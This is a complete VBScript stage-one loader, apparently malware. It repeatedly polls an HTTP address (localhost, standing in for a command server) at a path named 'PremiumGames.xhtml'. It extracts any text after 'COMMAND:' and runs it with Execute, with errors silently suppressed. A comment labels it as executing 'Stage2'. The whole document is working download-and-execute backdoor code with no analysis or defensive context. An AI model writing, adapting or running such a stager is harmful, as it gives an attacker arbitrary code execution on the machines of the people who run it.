On Error Resume Next
Set Shell = CreateObject("WScript.Shell")
Break = False
While Break <> True
    Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    XmlHttpReq.Open "GET", "http://127.0.0.1:80/PremiumGames.xhtml", false
    XmlHttpReq.Send
    If InStr(XmlHttpReq.responseText, "COMMAND:") Then
        'WScript.Echo "Stage1 Executing Stage2..." & VBNewLine & Mid(XmlHttpReq.responseText, InStr(XmlHttpReq.responseText, "COMMAND:")+8, Len(XmlHttpReq.responseText))
        Execute Mid(XmlHttpReq.responseText, InStr(XmlHttpReq.responseText, "COMMAND:")+8, Len(XmlHttpReq.responseText))
        Break = True
    End If
Wend
